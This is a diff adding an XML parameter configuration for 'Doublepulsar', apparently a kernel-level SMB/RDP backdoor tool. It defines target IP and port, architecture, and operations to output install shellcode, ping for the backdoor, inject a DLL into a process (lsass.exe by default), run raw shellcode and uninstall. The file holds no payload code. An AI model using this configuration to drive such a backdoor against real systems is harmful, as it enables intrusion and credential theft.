@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<config xmlns="urn:trch"
+        id="a748cf79831d6c2444050f18217611549fe3f619"
+        name="Doublepulsar"
+        version="1.3.1"
+        configversion="1.3.1.0"
+        schemaversion="2.0.0">
+    <inputparameters>
+        
+        <parameter name="NetworkTimeout" description="Timeout for blocking network calls (in seconds).  Use -1 for no timeout." type="S16">
+            <default>60</default>
+        </parameter>
+        <parameter name="TargetIp" xdevmap="TARGET_IP_V4_ADDRESS" description="Target IP Address" type="IPv4"/>
+        <parameter name="TargetPort" xdevmap="TARGET_PORT" description="Port used by the Double Pulsar back door" type="TcpPort">
+            <default>445</default>
+        </parameter>
+        
+        <paramchoice name="Protocol" xdevmap="DOUBLEPULSAR_PROTOCOL_TYPE" description="Protocol for the backdoor to speak">
+            <default>SMB</default>
+            <paramgroup name="SMB" description="Ring 0 SMB (TCP 445) backdoor">
+            </paramgroup>
+            <paramgroup name="RDP" description="Ring 0 RDP (TCP 3389) backdoor">
+            </paramgroup>
+        </paramchoice>
+        
+        <paramchoice name="Architecture" xdevmap="DOUBLEPULSAR_ARCHITECTURE_TYPE" description="Architecture of the target OS">
+            <default>x86</default>
+            <paramgroup name="x86" description="x86 32-bits">
+            </paramgroup>
+            <paramgroup name="x64" description="x64 64-bits">
+            </paramgroup>
+        </paramchoice>
+
+        <paramchoice name="Function" xdevmap="DOUBLEPULSAR_FUNCTION_TYPE" description="Operation for backdoor to perform">
+            <default>OutputInstall</default>
+            <paramgroup name="OutputInstall" description="Only output the install shellcode to a binary file on disk.">
+                <parameter name="OutputFile" description="Full path to the output file" type="String"/>
+            </paramgroup>
+
+            <paramgroup name="Ping" description="Test for presence of backdoor">
+            </paramgroup>
+            
+            <paramgroup name="RunDLL" description="Use an APC to inject a DLL into a user mode process.">
+                <parameter name="DllPayload" xdevmap="DOUBLEPULSAR_DLL_PAYLOAD" description="DLL to inject into user mode" type="LocalFile" />
+                <parameter name="DllOrdinal" xdevmap="DOUBLEPULSAR_DLL_ORDINAL" description="The exported ordinal number of the DLL being injected to call" type="U32" >
+                    <default>1</default>
+                </parameter>
+                <parameter name="ProcessName" xdevmap="DOUBLEPULSAR_PROCESS_NAME" description="Name of process to inject into" type="String">
+                    <default>lsass.exe</default>
+                </parameter>
+                <parameter name="ProcessCommandLine" xdevmap="DOUBLEPULSAR_COMMAND_LINE" description="Command line of process to inject into" type="String">
+                    <default></default>
+                </parameter>
+                
+            </paramgroup>
+
+            <paramgroup name="RunShellcode" description="Run raw shellcode">
+                <parameter name="ShellcodeFile" description="Full path to the file containing shellcode" type="LocalFile"/>
+                <parameter name="ShellcodeData" xdevmap="EXPLOIT_SHELLCODE" description="Full path to the file containing shellcode to run" type="LocalFile" />
+            </paramgroup>
+            
+            <paramgroup name="Uninstall" description="Remove's backdoor from system">
+            </paramgroup>
+        </paramchoice>
+    </inputparameters>
+        
+    <outputparameters>
+        <paramchoice name="Function" xdevmap="DOUBLEPULSAR_FUNCTION_TYPE" description="Operation for backdoor to perform">
+            <paramgroup name="OutputInstall" description="Only output the install shellcode to a file on disk.">
+                <parameter name="ShellcodeFile" description="Full path to the file containing Double Pulsar shellcode installer" type="String" />
+                <parameter name="ShellcodeData" xdevmap="EXPLOIT_SHELLCODE" description="Full path to the file containing Double Pulsar shellcode installer" type="LocalFile" />
+            </paramgroup>
+
+            <paramgroup name="Ping" description="Test for presence of backdoor">
+                <parameter name="Is64Bit" xdevmap="DOUBLEPULSAR_IS_64_BIT" description="Is target 64 or 32 bit" type="U32" />
+            </paramgroup>
+            <paramgroup name="RunDLL" description="Inject a DLL into a user mode process.">
+                <parameter name="Is64Bit" xdevmap="DOUBLEPULSAR_IS_64_BIT" description="Is target 64 or 32 bit" type="U32" />
+            </paramgroup>
+            <paramgroup name="Uninstall" description="Remove's backdoor from system">
+                <parameter name="Is64Bit" xdevmap="DOUBLEPULSAR_IS_64_BIT" description="Is target 64 or 32 bit" type="U32" />
+            </paramgroup>
+        </paramchoice>
+    </outputparameters>
+
+    <redirection>
+        <local protocol="TCP"
+               listenaddr="TargetIp"
+               listenport="TargetPort"
+               destaddr="TargetIp"
+               destport="TargetPort"
+               closeoncompletion="true"/>
+    </redirection>
+</config>
